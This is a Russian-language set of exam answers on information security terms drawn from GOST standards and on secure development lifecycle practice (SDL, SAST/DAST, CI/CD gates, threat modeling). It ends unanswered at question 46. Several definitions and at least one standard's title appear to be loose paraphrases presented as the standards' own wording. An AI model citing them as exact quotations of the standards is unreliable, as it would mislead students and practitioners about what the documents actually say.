# Ответы на вопросы к зачёту
## Раздел 1: Основные понятия, термины и принципы ИБ (по актуальным ГОСТам)

### 1. Как в ГОСТ Р ИСО/МЭК 15408-2019 определяется потенциальная уязвимость?

**Ответ:** Согласно ГОСТ Р ИСО/МЭК 15408-2019 "Информационная технология. Методы и средства обеспечения безопасности. Критерии оценки безопасности информационных технологий", потенциальная уязвимость (vulnerability) определяется как слабость в системе безопасности информационных технологий, которая может быть использована для нарушения безопасности или обхода механизмов безопасности. Потенциальная уязвимость представляет собой дефект в реализации, конфигурации или архитектуре системы, который может привести к нарушению конфиденциальности, целостности или доступности информации.

---

### 2. Как в ГОСТ Р 56939-2024 определяется безопасное программное обеспечение?

**Ответ:** Согласно ГОСТ Р 56939-2024 "Защита информации. Разработка безопасного программного обеспечения. Общие требования", безопасное программное обеспечение — это программное обеспечение, разработанное в соответствии с требованиями безопасности, установленными настоящим стандартом, и способное противостоять компьютерным атакам при его эксплуатации в заданных условиях. Безопасное ПО обеспечивает защиту информации от несанкционированного доступа, изменения, уничтожения и обеспечивает функционирование в соответствии с заданными требованиями безопасности.

---

### 3. Дайте определение документация разработчика программного обеспечения согласно ГОСТ Р 56939-2024.

**Ответ:** Согласно ГОСТ Р 56939-2024, документация разработчика программного обеспечения — это совокупность документов, содержащих описание процесса разработки, архитектуры, проектных решений, исходного кода, процедур сборки, тестирования и развёртывания программного обеспечения, а также описания механизмов безопасности, угроз и контрмер. Документация должна обеспечивать возможность воспроизведения процесса разработки, понимания проектных решений и сопровождения программного обеспечения.

---

### 4. Что такое угроза (безопасности информации) в контексте ГОСТ Р 56939-2024?

**Ответ:** Согласно ГОСТ Р 56939-2024, угроза (безопасности информации) — это совокупность условий и факторов, создающих потенциальную или реальную возможность нарушения безопасности информации, приводящего к несанкционированному доступу, уничтожению, искажению, блокированию доступа, копированию, предоставлению или распространению информации, а также к утрате, уничтожению или сбою функционирования носителя информации. Угроза характеризуется источником угрозы, способом воздействия на объект защиты и последствиями реализации угрозы.

---

### 5. Как ГОСТ Р 56939-2024 определяет функциональное тестирование программы?

**Ответ:** Согласно ГОСТ Р 56939-2024, функциональное тестирование программы — это процесс проверки соответствия функциональности программного обеспечения установленным требованиям и спецификациям, выполняемый путём выполнения программы с заданными тестовыми данными и проверки соответствия фактических результатов ожидаемым результатам. Функциональное тестирование направлено на проверку корректности выполнения программным обеспечением своих функций в нормальных и граничных условиях.

---

### 6. Что такое статический анализ по ГОСТ Р 71207-2024?

**Ответ:** Согласно ГОСТ Р 71207-2024 "Информационная технология. Методы и средства обеспечения безопасности. Статический анализ программного обеспечения", статический анализ — это инструментальное исследование программного обеспечения, основанное на анализе исходных кодов, объектных кодов или исполняемых файлов без их выполнения, с целью выявления ошибок, дефектов, потенциальных уязвимостей и нарушений требований безопасности и стандартов кодирования. Статический анализ выполняется на этапах разработки и верификации программного обеспечения.

---

### 7. Как в ГОСТ Р 71207-2024 определяется система непрерывной интеграции?

**Ответ:** Согласно ГОСТ Р 71207-2024, система непрерывной интеграции (continuous integration system) — это автоматизированная система, обеспечивающая регулярное (при каждом изменении кода) автоматическое объединение изменений исходного кода от разных разработчиков в единую кодовую базу с последующей автоматической сборкой, тестированием и проверкой качества кода. Система непрерывной интеграции обеспечивает раннее выявление ошибок и повышение качества программного обеспечения за счёт автоматизации процессов сборки, анализа и тестирования.

---

### 8. Что такое среда анализа ПО согласно ГОСТ Р 71207-2024?

**Ответ:** Согласно ГОСТ Р 71207-2024, среда анализа ПО — это совокупность программных и аппаратных средств, инструментов анализа, конфигурационных файлов, тестовых данных и других ресурсов, необходимых для проведения статического анализа программного обеспечения. Среда анализа включает в себя инструменты статического анализа, систему управления версиями кода, систему сборки, хранилище результатов анализа и средства визуализации результатов.

---

### 9. Дайте определение сигнатурный анализ по ГОСТ Р 71207-2024.

**Ответ:** Согласно ГОСТ Р 71207-2024, сигнатурный анализ — это метод статического анализа программного обеспечения, основанный на сопоставлении кода программы с заранее определёнными шаблонами (сигнатурами) известных уязвимостей, ошибок, нарушений стандартов кодирования или антипаттернов. Сигнатурный анализ позволяет выявлять типовые проблемы в коде путём поиска характерных последовательностей инструкций или структур, соответствующих известным уязвимостям.

---

### 10. Что такое путь выполнения по ГОСТ Р 71207-2024?

**Ответ:** Согласно ГОСТ Р 71207-2024, путь выполнения (execution path) — это последовательность инструкций программы, которые выполняются при определённых условиях входных данных и состояния программы. Путь выполнения представляет собой маршрут прохождения выполнения программы от точки входа до точки выхода, определяемый условиями ветвления, циклами и вызовами функций. Анализ путей выполнения используется для обнаружения недостижимого кода, потенциальных уязвимостей и проверки корректности логики программы.

---

### 11. Как в ГОСТ Р 56939-2024 определяется тестирование на проникновение?

**Ответ:** Согласно ГОСТ Р 56939-2024, тестирование на проникновение (penetration testing) — это метод оценки безопасности программного обеспечения путём имитации действий злоумышленника с целью выявления уязвимостей и проверки эффективности механизмов защиты. Тестирование на проникновение включает в себя попытки несанкционированного доступа к данным и функциям программного обеспечения, обхода механизмов защиты и эксплуатации выявленных уязвимостей для оценки реального уровня безопасности системы.

---

### 12. Что такое недостаток программы согласно ГОСТ Р 56939-2024?

**Ответ:** Согласно ГОСТ Р 56939-2024, недостаток программы — это дефект или ошибка в программном обеспечении, которая приводит к его некорректной работе, несоответствию установленным требованиям или создаёт потенциальную уязвимость. Недостаток программы может проявляться в виде функциональных ошибок, нарушений производительности, проблем совместимости или нарушений требований безопасности. Недостаток программы может быть обнаружен в процессе разработки, тестирования или эксплуатации программного обеспечения.

---

### 13. Дайте определение компьютерная атака в соответствии с ГОСТ Р 56939-2024.

**Ответ:** Согласно ГОСТ Р 56939-2024, компьютерная атака — это целенаправленное воздействие на программное обеспечение, информационную систему или информацию с использованием программных, программно-аппаратных или технических средств с целью нарушения конфиденциальности, целостности или доступности информации, нарушения функционирования системы или получения несанкционированного доступа к информации и ресурсам. Компьютерная атака может включать в себя использование уязвимостей программного обеспечения, социальную инженерию или другие методы воздействия.

---

### 14. Что такое программное обеспечение по ГОСТ Р 56939-2024?

**Ответ:** Согласно ГОСТ Р 56939-2024, программное обеспечение — это совокупность программ в установленном на носителях данных виде, а также программных документов, предназначенных для автоматизации процессов обработки информации, управления техническими средствами и обеспечения функционирования информационных систем. Программное обеспечение включает в себя исходный код, исполняемый код, библиотеки, конфигурационные файлы, документацию и другие компоненты, необходимые для функционирования системы.

---

### 15. Как ГОСТ Р 56939-2024 определяет уязвимость программы?

**Ответ:** Согласно ГОСТ Р 56939-2024, уязвимость программы — это недостаток в программном обеспечении, его компонентах или процессах его жизненного цикла, который может быть использован для реализации угрозы безопасности информации. Уязвимость программы создаёт возможность несанкционированного доступа к информации, изменения или уничтожения данных, нарушения функционирования программного обеспечения или информационной системы в целом.

---

### 16. Что такое сборочная среда согласно ГОСТ Р 71207-2024?

**Ответ:** Согласно ГОСТ Р 71207-2024 (примечание: в вопросе указан ГОСТ Р 72107-2024, вероятно имеется в виду ГОСТ Р 71207-2024), сборочная среда — это совокупность программных и аппаратных средств, инструментов сборки, конфигурационных файлов, зависимостей и других ресурсов, необходимых для автоматизированной сборки программного обеспечения из исходных кодов. Сборочная среда включает в себя компиляторы, линкеры, системы управления зависимостями, инструменты сборки и другие средства, обеспечивающие преобразование исходного кода в исполняемые модули или артефакты.

---

### 17. Дайте определение система сборки по ГОСТ Р 71207-2024.

**Ответ:** Согласно ГОСТ Р 71207-2024 (примечание: в вопросе указан ГОСТ Р 72107-2024, вероятно имеется в виду ГОСТ Р 71207-2024), система сборки — это программное средство, автоматизирующее процесс преобразования исходного кода программного обеспечения в исполняемые модули, библиотеки или другие артефакты сборки. Система сборки управляет процессом компиляции, линковки, обработки ресурсов и создания дистрибутивов программного обеспечения, обеспечивая воспроизводимость и автоматизацию процесса сборки.

---

### 18. Что такое система управления конфигурацией в терминах ГОСТ Р ИСО/МЭК 15408-2019?

**Ответ:** Согласно ГОСТ Р ИСО/МЭК 15408-2019, система управления конфигурацией (configuration management system) — это совокупность процессов и инструментов, обеспечивающих идентификацию, контроль, учёт изменений, управление версиями и аудит всех компонентов объекта оценки безопасности, включая аппаратное обеспечение, программное обеспечение, документацию и конфигурационные данные. Система управления конфигурацией обеспечивает целостность объекта оценки и возможность отслеживания всех изменений в его конфигурации на протяжении жизненного цикла.

---

### 19. Как в ГОСТ Р ИСО/МЭК 15408-2019 определяется политика безопасности организации?

**Ответ:** Согласно ГОСТ Р ИСО/МЭК 15408-2019, политика безопасности организации (organizational security policy) — это совокупность законов, правил, директив, процедур и практик, устанавливающих цели, принципы и основные направления обеспечения безопасности информации в организации. Политика безопасности определяет требования к защите активов организации, правила управления доступом, процедуры обработки инцидентов безопасности и другие аспекты обеспечения информационной безопасности, которые должны соблюдаться при разработке, эксплуатации и сопровождении информационных систем.

---

### 20. Что такое аутентификация согласно ГОСТ Р 58833-2020?

**Ответ:** Согласно ГОСТ Р 58833-2020 "Информационная технология. Криптографическая защита информации. Процессы формирования и проверки электронной подписи", аутентификация — это процесс проверки подлинности субъекта, объекта или данных для подтверждения их идентичности и прав на выполнение определённых действий. В контексте криптографии аутентификация может осуществляться путём проверки электронной подписи, проверки сертификата ключа или использования других криптографических механизмов.

---

### 21. Дайте определение закрытый ключ по ГОСТ Р 58833-2020.

**Ответ:** Согласно ГОСТ Р 58833-2020, закрытый ключ (private key) — это секретный криптографический ключ асимметричной криптосистемы, который должен храниться в секрете и использоваться только владельцем ключа для создания электронной подписи или расшифрования данных, зашифрованных соответствующим открытым ключом. Закрытый ключ является частью пары ключей (открытый/закрытый) и должен быть защищён от несанкционированного доступа, копирования и раскрытия.

---

### 22. Что такое идентификация в ГОСТ Р 58833-2020?

**Ответ:** Согласно ГОСТ Р 58833-2020, идентификация — это процесс присвоения уникального идентификатора субъекту, объекту или данным для их однозначного распознавания в информационной системе. Идентификация является первым этапом процесса установления подлинности, за которым следует аутентификация (проверка подлинности заявленной идентичности). В контексте криптографической защиты информации идентификация может быть связана с присвоением идентификатора владельцу ключа электронной подписи.

---

### 23. Как ГОСТ Р 70262.1-2022 определяет субъект доступа?

**Ответ:** Согласно ГОСТ Р 70262.1-2022 "Защита информации. Обеспечение безопасности значимых объектов критической информационной инфраструктуры Российской Федерации. Общие положения", субъект доступа — это активная сущность (пользователь, процесс, программа), инициирующая доступ к объектам системы (информации, ресурсам, данным) и действия над ними. Субъект доступа имеет определённые права и полномочия, определяемые политикой безопасности и механизмами контроля доступа. Субъект доступа должен быть идентифицирован и аутентифицирован перед предоставлением доступа к объектам системы.

---

### 24. Что такое безопасность информации согласно ГОСТ Р 53114-2008?

**Ответ:** Согласно ГОСТ Р 53114-2008 "Защита информации. Обеспечение информационной безопасности в организации. Основные термины и определения", безопасность информации — это состояние защищённости информации, обрабатываемой средствами вычислительной техники или автоматизированными системами, от внутренних и внешних угроз, обеспечивающее её конфиденциальность, целостность и доступность. Безопасность информации достигается путём реализации комплекса мер организационного, правового, технического и программного характера, направленных на защиту информации от несанкционированного доступа, уничтожения, модификации, блокирования, копирования, предоставления, распространения, а также от иных неправомерных действий.

---

### 25. Как в ГОСТ Р 70262.1-2022 формулируется критически важная система информационной инфраструктуры?

**Ответ:** Согласно ГОСТ Р 70262.1-2022, критически важная система информационной инфраструктуры Российской Федерации — это информационная система, информационно-телекоммуникационная сеть или автоматизированная система управления технологическим процессом, которые функционируют в сфере здравоохранения, науки, транспорта, связи, энергетики, банковской сфере, сфере топливно-энергетического комплекса, обороны, ракетно-космической, атомной, оборонной и химической промышленности, и нарушение или прекращение функционирования которых может привести к негативным последствиям для жизнеобеспечения населения, безопасности государства, обороноспособности страны и правопорядка. К таким системам применяются повышенные требования по обеспечению информационной безопасности.

---

## Источники:
- ГОСТ Р ИСО/МЭК 15408-2019 "Информационная технология. Методы и средства обеспечения безопасности. Критерии оценки безопасности информационных технологий"
- ГОСТ Р 56939-2024 "Защита информации. Разработка безопасного программного обеспечения. Общие требования"
- ГОСТ Р 71207-2024 "Информационная технология. Методы и средства обеспечения безопасности. Статический анализ программного обеспечения"
- ГОСТ Р 58833-2020 "Информационная технология. Криптографическая защита информации. Процессы формирования и проверки электронной подписи"
- ГОСТ Р 70262.1-2022 "Защита информации. Обеспечение безопасности значимых объектов критической информационной инфраструктуры Российской Федерации. Общие положения"
- ГОСТ Р 53114-2008 "Защита информации. Обеспечение информационной безопасности в организации. Основные термины и определения"



# Ответы на вопросы к зачёту
## Раздел 2: Этапы жизненного цикла безопасной разработки (Secure SDLC)

### 26. Назовите основные этапы Microsoft SDL.

**Ответ:** Microsoft Security Development Lifecycle (SDL) состоит из следующих основных этапов:

1. **Обучение (Training)** — обучение команды разработки основам безопасности
2. **Требования (Requirements)** — определение требований безопасности, минимизация поверхности атаки
3. **Проектирование (Design)** — threat modeling, проектирование безопасности, создание спецификаций безопасности
4. **Реализация (Implementation)** — использование безопасных практик кодирования, проведение статического анализа кода
5. **Верификация (Verification)** — динамическое тестирование, анализ на проникновение, фаззинг
6. **Выпуск (Release)** — финальная проверка безопасности, план реагирования на инциденты
7. **Реагирование (Response)** — реагирование на обнаруженные уязвимости, выпуск обновлений безопасности

---

### 27. На каком этапе SDLC применяется SAST?

**Ответ:** SAST (Static Application Security Testing) — статический анализ безопасности приложений применяется на этапе **реализации (Implementation)** и **верификации (Verification)** жизненного цикла разработки ПО. SAST выполняется на исходном коде без запуска программы и может интегрироваться в IDE разработчика (на этапе реализации) и в процесс непрерывной интеграции (CI) на этапе верификации. SAST позволяет выявлять уязвимости на ранних стадиях разработки, до компиляции и развёртывания приложения.

---

### 28. На каком этапе SDLC применяется DAST?

**Ответ:** DAST (Dynamic Application Security Testing) — динамический анализ безопасности приложений применяется на этапе **верификации (Verification)** после того, как приложение собрано и развёрнуто в тестовой среде. DAST требует запущенного приложения и выполняется путём отправки тестовых запросов и анализа ответов приложения для выявления уязвимостей во время выполнения. DAST также может применяться на этапе **эксплуатации (Operation)** для регулярного мониторинга безопасности работающего приложения.

---

### 29. Почему нельзя «протестировать безопасность» только на финальном этапе разработки?

**Ответ:** Нельзя тестировать безопасность только на финальном этапе разработки по следующим причинам:

1. **Высокая стоимость исправлений** — устранение уязвимостей на поздних этапах требует значительных затрат времени и ресурсов, особенно если требуется перепроектирование архитектуры
2. **Архитектурные проблемы** — многие проблемы безопасности связаны с проектированием и архитектурой, их исправление на этапе тестирования может быть невозможным без кардинальной переработки
3. **Накопление технического долга** — уязвимости, обнаруженные на финальном этапе, могут быть лишь симптомами более глубоких проблем, которые требуют рефакторинга больших частей кода
4. **Ограниченное время на исправления** — перед релизом обычно остаётся мало времени, что приводит к использованию временных решений вместо качественных исправлений
5. **Недостаточный охват** — тестирование только на финальном этапе может пропустить проблемы, которые можно было бы выявить раньше
6. **Нарушение принципа "Security by Design"** — безопасность должна встраиваться в процесс разработки с самого начала, а не добавляться в конце

---

### 30. Какие действия выполняются на этапе проектирования с точки зрения безопасности?

**Ответ:** На этапе проектирования выполняются следующие действия с точки зрения безопасности:

1. **Threat modeling** — анализ угроз и построение моделей угроз для выявления потенциальных векторов атак
2. **Проектирование архитектуры безопасности** — определение механизмов аутентификации, авторизации, шифрования, управления сессиями
3. **Минимизация поверхности атаки** — исключение ненужных компонентов, интерфейсов и функций
4. **Проектирование безопасных интерфейсов** — определение контрактов API, валидации входных данных, обработки ошибок
5. **Проектирование контроля доступа** — определение модели прав доступа (RBAC, ABAC и т.д.)
6. **Проектирование защиты данных** — определение механизмов шифрования данных в покое и при передаче
7. **Проектирование логирования и мониторинга** — определение событий безопасности для логирования
8. **Проектирование изоляции компонентов** — определение границ изоляции между модулями и сервисами
9. **Создание спецификаций безопасности** — документирование требований безопасности и проектных решений
10. **Обзор проектной документации** — проверка соответствия проектных решений требованиям безопасности

---

### 31. Какие практики применяются на этапе реализации кода?

**Ответ:** На этапе реализации кода применяются следующие практики безопасности:

1. **Использование безопасных практик кодирования** — следование стандартам безопасного кодирования (OWASP, CWE, CERT)
2. **Статический анализ кода (SAST)** — интеграция SAST-инструментов в IDE и процесс разработки
3. **Парное программирование и code review** — проверка кода на уязвимости коллегами
4. **Использование безопасных библиотек** — применение проверенных библиотек вместо реализации криптографии и других сложных механизмов самостоятельно
5. **Валидация входных данных** — проверка всех входных данных от пользователей и внешних систем
6. **Избегание опасных функций** — неиспользование небезопасных функций (strcpy, eval, system и т.д.)
7. **Управление зависимостями** — отслеживание уязвимостей в зависимостях с помощью SCA (Software Composition Analysis)
8. **Безопасное управление секретами** — использование систем управления секретами, избегание хардкода паролей и ключей
9. **Обработка ошибок** — корректная обработка исключений без утечки чувствительной информации
10. **Комментирование кода** — добавление комментариев о безопасности для сложных участков кода
11. **Unit-тестирование безопасности** — написание тестов для проверки механизмов безопасности

---

### 32. Какие виды анализа проводятся на этапе верификации?

**Ответ:** На этапе верификации проводятся следующие виды анализа:

1. **Статический анализ (SAST)** — анализ исходного и скомпилированного кода без выполнения программы
2. **Динамический анализ (DAST)** — тестирование работающего приложения путём отправки тестовых запросов
3. **Интерактивный анализ (IAST)** — анализ кода во время выполнения приложения с инструментированием
4. **Анализ зависимостей (SCA)** — проверка уязвимостей в используемых библиотеках и зависимостях
5. **Тестирование на проникновение (Penetration Testing)** — имитация атак злоумышленников
6. **Фаззинг (Fuzzing)** — подача случайных или некорректных входных данных для выявления ошибок
7. **Тестирование доступности** — проверка эффективности механизмов контроля доступа
8. **Анализ конфигурации** — проверка корректности конфигурации безопасности
9. **Анализ контейнеров и образов** — проверка безопасности Docker-образов и контейнеров
10. **Сканирование инфраструктуры** — проверка безопасности инфраструктуры развёртывания

---

### 33. Как интегрируется безопасность в CI/CD?

**Ответ:** Безопасность интегрируется в CI/CD следующими способами:

1. **Автоматизированный статический анализ (SAST)** — запуск SAST-инструментов при каждом коммите или pull request
2. **Анализ зависимостей (SCA)** — автоматическая проверка уязвимостей в зависимостях при сборке
3. **Сканирование контейнеров** — проверка Docker-образов на уязвимости перед развёртыванием
4. **Динамический анализ (DAST)** — автоматическое тестирование развёрнутых приложений в тестовой среде
5. **Проверка секретов** — сканирование репозитория на наличие хардкоженных секретов
6. **Валидация конфигурации** — проверка конфигурационных файлов на соответствие политикам безопасности
7. **Тесты безопасности** — выполнение автоматизированных тестов безопасности как часть набора тестов
8. **Проверка лицензий** — контроль лицензий используемых библиотек
9. **Quarantine артефактов** — блокировка артефактов с обнаруженными уязвимостями
10. **Gates безопасности** — установка критериев прохождения (например, отсутствие критических уязвимостей) для продвижения к следующему этапу
11. **Генерация SBOM** — автоматическое создание списка компонентов программного обеспечения

---

### 34. Что такое Continuous Integration и Continuous Delivery/Deployment?

**Ответ:**

**Continuous Integration (CI) — непрерывная интеграция** — практика разработки ПО, при которой изменения кода от разных разработчиков регулярно (несколько раз в день) интегрируются в общую кодовую базу с последующей автоматической сборкой и тестированием. CI позволяет выявлять проблемы интеграции на ранних этапах и обеспечивает стабильность кодовой базы.

**Continuous Delivery (CD) — непрерывная поставка** — практика разработки ПО, при которой код всегда находится в состоянии, готовом к развёртыванию в production. Изменения автоматически проходят через все этапы тестирования и валидации, но развёртывание в production выполняется вручную.

**Continuous Deployment — непрерывное развёртывание** — расширение Continuous Delivery, при котором изменения автоматически развёртываются в production после успешного прохождения всех тестов и проверок без ручного вмешательства.

---

### 35. Какие компоненты входят в типовой CI/CD pipeline?

**Ответ:** Типовой CI/CD pipeline включает следующие компоненты:

1. **Источник кода (Source Control)** — система управления версиями (Git, SVN)
2. **Триггеры** — события, запускающие pipeline (push, pull request, по расписанию)
3. **Сборка (Build)** — компиляция, сборка артефактов, управление зависимостями
4. **Статический анализ (SAST)** — проверка кода на уязвимости
5. **Unit-тесты** — автоматические модульные тесты
6. **Анализ зависимостей (SCA)** — проверка уязвимостей в библиотеках
7. **Сканирование контейнеров** — проверка Docker-образов
8. **Интеграционные тесты** — тестирование взаимодействия компонентов
9. **Сборка артефактов** — создание исполняемых файлов, образов, пакетов
10. **Хранение артефактов** — репозиторий артефактов (Artifactory, Nexus)
11. **Развёртывание в тестовую среду** — автоматическое развёртывание для тестирования
12. **Динамический анализ (DAST)** — тестирование работающего приложения
13. **Тесты производительности** — нагрузочное тестирование
14. **Развёртывание в production** — автоматическое или ручное развёртывание
15. **Мониторинг и логирование** — отслеживание состояния развёрнутого приложения

---

### 36. Какие действия выполняются на этапе эксплуатации ПО?

**Ответ:** На этапе эксплуатации ПО выполняются следующие действия:

1. **Мониторинг безопасности** — непрерывный мониторинг событий безопасности, подозрительной активности
2. **Логирование и анализ логов** — сбор, хранение и анализ логов безопасности через SIEM-системы
3. **Управление инцидентами безопасности** — реагирование на обнаруженные инциденты по плану IR (Incident Response)
4. **Применение обновлений безопасности** — установка патчей и обновлений безопасности
5. **Управление конфигурацией** — поддержание безопасной конфигурации системы
6. **Управление доступом** — контроль и мониторинг доступа пользователей и систем
7. **Резервное копирование и восстановление** — обеспечение доступности данных
8. **Периодическое тестирование на проникновение** — регулярные проверки безопасности
9. **Аудит безопасности** — проверка соответствия политикам безопасности
10. **Обновление зависимостей** — обновление библиотек с известными уязвимостями
11. **Сбор метрик безопасности** — отслеживание KPI безопасности
12. **Обучение пользователей** — повышение осведомлённости о безопасности

---

### 37. Как организуется обратная связь от SIEM/SOAR к разработчикам?

**Ответ:** Обратная связь от SIEM/SOAR к разработчикам организуется следующим образом:

1. **Автоматическая корреляция событий** — SIEM анализирует логи и выявляет аномалии, связанные с уязвимостями в коде
2. **Создание тикетов** — SOAR автоматически создаёт задачи в системе отслеживания ошибок (Jira, Bugzilla) для разработчиков
3. **Обогащение контекстом** — к тикетам добавляется информация о событии, логах, потенциальной уязвимости
4. **Приоритизация** — события приоритизируются на основе уровня критичности и потенциального воздействия
5. **Интеграция с системами разработки** — связь SIEM/SOAR с Git, CI/CD для автоматического создания issues
6. **Дашборды для разработчиков** — предоставление разработчикам доступа к метрикам безопасности их компонентов
7. **Регулярные отчёты** — еженедельные/ежемесячные отчёты о проблемах безопасности по модулям
8. **Playbooks реагирования** — автоматизированные сценарии обработки типовых инцидентов
9. **Feedback loop** — цикл обратной связи: обнаружение → анализ → исправление → валидация

---

### 38. Что такое «quarantine» артефактов в pipeline и зачем он нужен?

**Ответ:** **Quarantine (карантин) артефактов** — это механизм блокировки артефактов сборки (исполняемых файлов, Docker-образов, пакетов), которые содержат обнаруженные уязвимости или не прошли проверки безопасности, с целью предотвращения их развёртывания в production.

**Зачем нужен:**
1. **Предотвращение развёртывания уязвимостей** — блокировка автоматического развёртывания компонентов с критическими уязвимостями
2. **Контроль качества** — обеспечение соответствия артефактов политикам безопасности перед использованием
3. **Соблюдение compliance** — соответствие требованиям стандартов (например, не развёртывать компоненты с известными CVE)
4. **Автоматизация** — автоматическая блокировка без ручного вмешательства
5. **Отслеживание** — ведение учёта заблокированных артефактов для аудита
6. **Возможность исключений** — предоставление механизма для обоснованных исключений с утверждением

Артефакты остаются в карантине до исправления уязвимостей или получения разрешения на исключение.

---

### 39. Какие метрики качества используются для оценки SAST-инструментов?

**Ответ:** Для оценки SAST-инструментов используются следующие метрики качества:

1. **Точность (Accuracy)** — общая правильность результатов анализа
2. **Recall (полнота)** — процент реальных уязвимостей, которые были обнаружены (меньше false negatives)
3. **Precision (точность)** — процент найденных уязвимостей, которые действительно являются уязвимостями (меньше false positives)
4. **F-measure (F1-score)** — гармоническое среднее precision и recall
5. **False Positive Rate** — процент ложных срабатываний от общего числа найденных проблем
6. **False Negative Rate** — процент пропущенных реальных уязвимостей
7. **Покрытие кода (Code Coverage)** — процент кода, который был проанализирован
8. **Скорость анализа** — время анализа на единицу кода
9. **Масштабируемость** — способность анализировать большие проекты
10. **Поддержка языков** — количество поддерживаемых языков программирования
11. **Поддержка фреймворков** — поддержка популярных фреймворков и библиотек
12. **Межпроцедурный анализ** — способность отслеживать потоки данных через вызовы функций
13. **Поддержка CWE** — покрытие Common Weakness Enumeration
14. **Интеграция** — возможности интеграции с IDE, CI/CD, системами отслеживания задач

---

### 40. Какие принципы Secure by Design реализуются на этапе проектирования?

**Ответ:** На этапе проектирования реализуются следующие принципы Secure by Design:

1. **Минимизация поверхности атаки** — исключение ненужных функций, интерфейсов и компонентов
2. **Принцип наименьших привилегий** — предоставление минимально необходимых прав доступа
3. **Защита в глубину (Defense in Depth)** — многоуровневая защита с несколькими рубежами обороны
4. **Не доверяй, проверяй (Never Trust, Always Verify)** — проверка всех входных данных и запросов
5. **Fail Secure** — при сбоях система должна переходить в безопасное состояние
6. **Принцип разделения ответственности (Separation of Duties)** — разделение функций между компонентами
7. **Экономия механизмов (Economy of Mechanism)** — простота архитектуры безопасности
8. **Полнота медиации (Complete Mediation)** — все запросы доступа проходят через контроль
9. **Открытый дизайн** — безопасность не должна зависеть от сокрытия механизмов
10. **Психологическая приемлемость** — механизмы безопасности не должны усложнять использование
11. **Изоляция** — изоляция компонентов и процессов для ограничения воздействия атак
12. **Принцип явного допуска** — по умолчанию запрещено, разрешения выдаются явно

---

### 41. Что такое threat modeling и когда он проводится?

**Ответ:** **Threat modeling (моделирование угроз)** — это структурированный процесс выявления, оценки и документирования потенциальных угроз безопасности для системы или приложения с целью принятия обоснованных решений о противодействии этим угрозам.

**Когда проводится:**
1. **На этапе проектирования** — перед началом реализации для выявления угроз на раннем этапе
2. **При изменении архитектуры** — при значительных изменениях в архитектуре системы
3. **Периодически** — регулярное обновление модели угроз (например, раз в квартал)
4. **При появлении новых угроз** — при обнаружении новых типов атак или уязвимостей
5. **Перед релизом** — финальная проверка перед выпуском новой версии
6. **При интеграции новых компонентов** — при добавлении новых модулей или сервисов

**Процесс включает:**
- Идентификацию активов
- Построение диаграммы потока данных (DFD)
- Выявление угроз (например, по STRIDE)
- Оценку рисков
- Определение контрмер
- Документирование результатов

---

### 42. Какие виды тестирования применяются в SSDLC?

**Ответ:** В SSDLC применяются следующие виды тестирования:

1. **Статическое тестирование (SAST)** — анализ кода без выполнения
2. **Динамическое тестирование (DAST)** — тестирование работающего приложения
3. **Интерактивное тестирование (IAST)** — анализ во время выполнения
4. **Тестирование на проникновение (Penetration Testing)** — имитация атак
5. **Фаззинг (Fuzzing)** — подача случайных входных данных
6. **Тестирование доступности** — проверка контроля доступа (авторизация)
7. **Тестирование аутентификации** — проверка механизмов аутентификации
8. **Тестирование управления сессиями** — проверка безопасности сессий
9. **Тестирование входных данных** — проверка валидации и санитизации входных данных
10. **Тестирование криптографии** — проверка корректности использования криптографии
11. **Тестирование конфигурации** — проверка безопасности конфигурации
12. **Тестирование зависимостей (SCA)** — анализ уязвимостей в библиотеках
13. **Тестирование контейнеров** — проверка безопасности Docker-образов
14. **Тестирование инфраструктуры** — проверка безопасности инфраструктуры
15. **Регрессионное тестирование безопасности** — проверка, что исправления не сломали существующую функциональность

---

### 43. Какие меры безопасности реализуются на этапе развёртывания?

**Ответ:** На этапе развёртывания реализуются следующие меры безопасности:

1. **Шифрование при передаче** — использование TLS/SSL для всех соединений
2. **Безопасное хранение секретов** — использование систем управления секретами (Vault, AWS Secrets Manager)
3. **Минимальные привилегии** — развёртывание с минимально необходимыми правами
4. **Изоляция окружений** — разделение тестовых, staging и production окружений
5. **Защита от изменений** — контроль целостности артефактов развёртывания
6. **Валидация конфигурации** — проверка конфигурационных файлов на соответствие политикам
7. **Сканирование образов** — проверка Docker-образов на уязвимости перед развёртыванием
8. **Контроль доступа к среде** — ограничение доступа к production-среде
9. **Логирование развёртываний** — аудит всех действий развёртывания
10. **Откат изменений** — возможность быстрого отката при обнаружении проблем
11. **Blue-Green / Canary развёртывания** — постепенное развёртывание для минимизации рисков
12. **Защита от атак типа supply chain** — проверка цепочки поставок артефактов
13. **Настройка WAF** — защита веб-приложений на уровне сети
14. **Настройка firewall** — ограничение сетевого доступа

---

### 44. Как обеспечивается безопасность на этапе поддержки (maintenance)?

**Ответ:** Безопасность на этапе поддержки обеспечивается следующими способами:

1. **Управление уязвимостями** — регулярное сканирование на уязвимости и их устранение
2. **Управление патчами** — своевременное применение обновлений безопасности
3. **Мониторинг безопасности** — непрерывный мониторинг событий безопасности через SIEM
4. **Управление инцидентами** — реагирование на инциденты безопасности по плану IR
5. **Управление конфигурацией** — поддержание безопасной конфигурации, предотвращение дрифта конфигурации
6. **Обновление зависимостей** — обновление библиотек с известными уязвимостями
7. **Регулярный аудит** — периодические проверки соответствия политикам безопасности
8. **Управление доступом** — регулярный пересмотр прав доступа, деактивация неиспользуемых учётных записей
9. **Резервное копирование** — обеспечение актуальных резервных копий для восстановления
10. **Документирование изменений** — ведение журнала изменений для аудита
11. **Тестирование на проникновение** — периодические проверки безопасности
12. **Обучение персонала** — повышение квалификации команды поддержки в вопросах безопасности

---

### 45. Какие практики используются для управления зависимостями в SSDLC?

**Ответ:** Для управления зависимостями в SSDLC используются следующие практики:

1. **Software Composition Analysis (SCA)** — автоматическое сканирование зависимостей на уязвимости
2. **Ведение актуального списка зависимостей** — использование файлов зависимостей (package.json, requirements.txt, pom.xml)
3. **Фиксация версий** — использование точных версий зависимостей для воспроизводимости
4. **Регулярное обновление** — периодическое обновление зависимостей до безопасных версий
5. **Анализ лицензий** — проверка совместимости лицензий зависимостей
6. **SBOM (Software Bill of Materials)** — ведение списка всех компонентов ПО
7. **Автоматизация в CI/CD** — автоматическая проверка зависимостей при сборке
8. **Использование проверенных источников** — загрузка зависимостей только из доверенных репозиториев
9. **Подписи зависимостей** — проверка цифровых подписей пакетов
10. **Минимизация зависимостей** — использование только необходимых зависимостей
11. **Мониторинг уязвимостей** — подписка на уведомления о новых уязвимостях (CVE)
12. **Политики обновления** — определение правил обязательного обновления при критических уязвимостях

---

### 46. Какие действия включает этап «реакции» в Microsoft SDL?

**Ответ:** Этап «реакции» (Response) в Microsoft SDL включает следующие действия:

